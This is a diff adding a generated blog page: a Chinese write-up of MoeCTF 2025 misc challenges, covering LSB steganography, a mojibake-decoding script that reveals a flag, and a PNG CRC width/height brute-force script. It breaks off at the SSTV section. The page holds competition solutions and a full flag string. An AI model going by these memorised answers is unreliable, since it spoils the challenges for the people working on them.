@@ -1,0 +1,1629 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="学习,生活">
+    
+    <meta name="author" content="xhxbb">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://xhxbb1.github.io/2025/08/17/moectf2025wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="学习记录，生活记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moectf2025wp">
+<meta property="og:url" content="https://xhxbb1.github.io/2025/08/17/moectf2025wp/index.html">
+<meta property="og:site_name" content="xhxbb blog">
+<meta property="og:description" content="学习记录，生活记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xhxbb1.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-08-17T13:13:37.000Z">
+<meta property="article:modified_time" content="2025-10-12T04:27:24.572Z">
+<meta property="article:author" content="xhxbb">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xhxbb1.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/myIcon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/myIcon.png">
+    <meta name="theme-color" content="#ff80ab">
+    <link rel="shortcut icon" href="/images/myIcon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            moectf2025wp | xhxbb的博客
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"xhxbb1.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#ff80ab","secondary":"#fce4ec","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":true,"family":null,"url":null},"title":{"enable":true,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome To xhxbb's Blog :)"},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"学习记录，生活记录"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/shu.png","dark":"/images/shu.png"},"title":"欢迎来到xhxbb的博客","subtitle":{"text":["你好你好你好你好你好你好你好:)"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":{"github":"https://github.com/xhxbb1","instagram":null,"zhihu":null,"twitter":null,"email":"xhx15800520768@outlook.com","bilibili":"https://space.bilibili.com/302129703?spm_id_from=333.1007.0.0"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"浸春芜","artist":"塞壬唱片-MSR/宋柏/十音/解伟芩","url":"images/bgMusic.mp3","cover":"images/jinchunwu.webp","lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":30},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-regular fa-tags","path":"/tags/"},"Categories":{"icon":"fa-regular fa-folder","path":"/categories/"},"Friends":{"icon":"fa-solid fa-link","path":"/links/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":null,"show_on_mobile":true,"links":{"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2025/7/23 12:02:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Welcome To xhxbb&#39;s Blog :)
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                xhxbb的博客
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">moectf2025wp</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/photo.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">xhxbb</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-17 21:13:37</span>
+        <span class="mobile">2025-08-17 21:13:37</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-12 12:27:24</span>
+            <span class="mobile">2025-10-12 12:27:24</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>flag在提示里。</p>
+<h1 id="安全杂项"><a href="#安全杂项" class="headerlink" title="安全杂项"></a>安全杂项</h1><h2 id="Misc入门指北"><a href="#Misc入门指北" class="headerlink" title="Misc入门指北"></a>Misc入门指北</h2><p>直接搜索栏搜索”ctf”，拉到最下，发现：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/sc_ru_men_ri_bei.png"
+                     
+                ><br>这里复制即可。</p>
+<h2 id="Pyjail-0"><a href="#Pyjail-0" class="headerlink" title="Pyjail 0"></a>Pyjail 0</h2><p>flag位于环境变量中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/jail0.png"
+                     
+                ></p>
+<h2 id="Pyjail-1"><a href="#Pyjail-1" class="headerlink" title="Pyjail 1"></a>Pyjail 1</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/jali1.png"
+                     
+                ></p>
+<h2 id="ez-LSB"><a href="#ez-LSB" class="headerlink" title="ez_LSB"></a>ez_LSB</h2><p>lsb隐写，直接zsteg。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_LSB.png"
+                     
+                ></p>
+<p>然后再base64解码即可获得flag。</p>
+<h2 id="ez-锟斤拷"><a href="#ez-锟斤拷" class="headerlink" title="ez_锟斤拷????"></a><strong>ez_锟斤拷????</strong></h2><blockquote>
+<p>百度一下：锟斤拷是中文互联网环境中常见的乱码字符组合，主要由编码转换错误引发 。该现象多出现在GBK与Unicode编码系统兼容性不足的场景，表现为连续无意义的汉字排列，例如”锟届瀿锟斤拷”等形态。</p>
+</blockquote>
+<p>这里直接gpt写脚本转换一下。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹&quot;</span>  <span class="comment"># 你看到的乱码</span></span><br><span class="line">b = a.encode(<span class="string">&quot;gbk&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag：ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全昔斤拷锟斤拷锟斤拷。</p>
+<blockquote>
+<p>什么是半角字符:半角字符（Half-width Character）是指<strong>宽度为一个标准英文字符（1字节）的字符</strong>。</p>
+</blockquote>
+<p>直接脚本转换</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹&quot;</span>  <span class="comment"># 你看到的乱码</span></span><br><span class="line">b = a.encode(<span class="string">&quot;gbk&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line">flag = unicodedata.normalize(<span class="string">&quot;NFKC&quot;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p>最后得到flag。</p>
+<hr>
+<h2 id="weird-photo"><a href="#weird-photo" class="headerlink" title="weird_photo"></a>weird_photo</h2><p>CRC校验改宽高</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     <span class="comment">#读取图片中的CRC校验值</span></span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                        <span class="comment">#宽度1-4000进行枚举</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                    <span class="comment">#高度1-4000进行枚举</span></span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):            <span class="comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h2><p>解压后获得一个.wav文件。</p>
